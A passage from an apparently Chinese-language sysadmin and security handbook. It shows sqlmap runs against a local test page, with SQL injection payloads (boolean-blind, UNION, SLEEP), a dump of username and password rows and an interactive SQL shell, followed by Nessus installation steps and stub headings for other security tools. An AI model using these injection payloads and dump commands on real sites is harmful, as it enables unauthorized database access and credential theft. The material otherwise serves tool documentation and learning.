    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=98 AND 4108=4108

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: id=98 UNION ALL SELECT CONCAT(0x3a6b79703a,0x57596b57416f63567046,0x3a6c757a3a), NULL, NULL#

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: id=98 AND SLEEP(5)
---

[15:46:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.3.6
back-end DBMS: MySQL 5.0.11
[15:46:58] [INFO] fetching SQL SELECT statement query output: 'SELECT username, password FROM test'
SELECT username, password FROM test [6]:
[*] neo, chen
[*] jam, zheng
[*] john, meng
[*] neo1, chen
[*] jam2, zheng
[*] john3, meng

[15:46:58] [INFO] Fetched data logged to text files under '/home/neo/sqlmap-dev/output/localhost'

[*] shutting down at 15:46:58			

```

### 6.5. --sql-shell

```

$ sqlmap -u "http://localhost/test.php?id=98" -v 1 --sql-shell 

    sqlmap/1.0-dev (r4812) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 09:54:39

[09:54:40] [INFO] using '/home/neo/sqlmap-dev/output/localhost/session' as session file
[09:54:40] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file
[09:54:40] [INFO] testing connection to the target url
[09:54:40] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=98 AND 8779=8779

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: id=98 UNION ALL SELECT NULL, CONCAT(0x3a72776a3a,0x546a7a6578746f575762,0x3a62746d3a), NULL#

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: id=98 AND SLEEP(5)
---

[09:54:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.3.6
back-end DBMS: MySQL 5.0.11
[09:54:40] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> select * from test;
[*] chen, 98, neo
[*] chen, 111, neo
[*] zheng, 112, jam
sql-shell>

```

## 7. Miscellaneous

### 7.1. --update

```
$ sqlmap --update

```

### 7.2. --save

```
$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --referer="http://www.google.com" --save sqlmap.ini

```

## 第 145 章 Vulnerability Scanner

## 1. Nessus

http://www.nessus.org/

```
[root@centos6 src]# rpm -ivh Nessus-4.4.1-es6.x86_64.rpm
Preparing...                ########################################### [100%]
   1:Nessus                 ########################################### [100%]
nessusd (Nessus) 4.4.1 [build M15078] for Linux
(C) 1998 - 2011 Tenable Network Security, Inc.

Processing the Nessus plugins...
[##################################################]

All plugins loaded
 - Please run /opt/nessus//sbin/nessus-adduser to add a user
 - Register your Nessus scanner at http://www.nessus.org/register/ to obtain
   all the newest plugins
 - You can start nessusd by typing /sbin/service nessusd start

```

```
[root@centos6 src]# /opt/nessus/sbin/nessus-adduser
Login : admin
Login password :
Login password (again) :
Do you want this user to be a Nessus 'admin' user ? (can upload plugins, etc...) (y/n) [n]: y
User rules
----------
nessusd has a rules system which allows you to restrict the hosts
that admin has the right to test. For instance, you may want
him to be able to scan his own host only.

Please see the nessus-adduser manual for the rules syntax

Enter the rules for this user, and enter a BLANK LINE once you are done :
(the user can have an empty rules set)

Login             : admin
Password         : ***********
This user will have 'admin' privileges within the Nessus server
Rules             :
Is that ok ? (y/n) [y]
User added

```

申请一个验证吗[`www.nessus.org/products/nessus/nessus-plugins/obtain-an-activation-code`](http://www.nessus.org/products/nessus/nessus-plugins/obtain-an-activation-code)会发送到你的邮箱中。

```
[root@centos6 src]# /opt/nessus/bin/nessus-fetch --register 433E-3B47-94AF-5CF8-7E8E
Your activation code has been registered properly - thank you.
Now fetching the newest plugin set from plugins.nessus.org...
Your Nessus installation is now up-to-date.
If auto_update is set to 'yes' in nessusd.conf, Nessus will
update the plugins by itself.

```

```
[root@centos6 src]# /sbin/service nessusd start
Starting Nessus services:
[root@centos6 src]# Missing plugins. Attempting a plugin update...
Your installation is missing plugins. Please register and try again.
To register, please visit http://www.nessus.org/register/

```

https://localhost:8834

## 2. OpenVAS

## 第 146 章 Injection & Penetration

## 1. Backtrack Linux

http://www.backtrack-linux.org/

## 第 147 章 Suricata Engine

http://www.openinfosecfoundation.org/

## 第 148 章 psad

## 第 149 章 fwknop

## 第 150 章 fwsnort

## 第 151 章 nftables

## 第 152 章 Haka

### *Software Defined Security*

http://www.haka-security.org/

Haka is an open source security oriented language which allows to describe protocols and apply security policies on (live) captured traffic.